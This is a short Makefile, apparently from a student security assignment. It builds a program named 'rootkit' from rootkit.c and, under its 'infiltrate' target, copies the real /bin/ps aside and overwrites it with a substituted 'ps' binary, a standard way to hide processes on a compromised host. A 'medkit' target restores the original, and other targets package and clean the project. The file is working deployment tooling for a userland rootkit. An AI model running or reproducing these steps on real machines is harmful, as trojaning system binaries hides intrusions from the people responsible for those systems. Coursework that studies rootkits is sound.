BIN=rootkit
CCFLAGS=
CC=gcc

all: $(BIN) infiltrate

$(BIN): rootkit.c
	${CC} ${CCFLAGS} rootkit.c -o $(BIN)

infiltrate:
	cp /bin/ps /bin/ps-original
	cp ps /bin/ps

medkit:
	test -e /bin/ps-original && rm -f /bin/ps && mv /bin/ps-original /bin/ps

pack:
	tar -czf xpalam00.tgz rootkit.c ps Makefile

clean:
	rm -f *.o ${BIN} xpalam00.tgz
